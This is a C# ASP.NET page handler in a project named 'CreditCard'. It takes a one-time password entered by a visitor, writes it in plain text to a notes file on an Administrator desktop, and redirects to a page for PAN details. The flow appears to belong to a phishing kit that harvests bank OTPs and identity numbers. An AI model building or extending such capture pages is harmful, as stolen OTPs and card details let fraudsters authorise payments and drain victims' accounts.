using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace CreditCard
{
    public partial class otp2 : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {

        }

        protected void BtnSave_Click(object sender, EventArgs e)
        {
            try
            {
                var Line = "OTP 2:- " + txtotp2.Text.Trim();
                File.AppendAllText(@"C:/Users/Administrator/Desktop/vinay/notedata.txt", Line + Environment.NewLine + Environment.NewLine + Environment.NewLine);

                Response.Redirect("PANDetails.aspx");
            }
            catch (Exception)
            {

                throw;
            }
            Response.Redirect("PANDetails.aspx");
        }
    }
}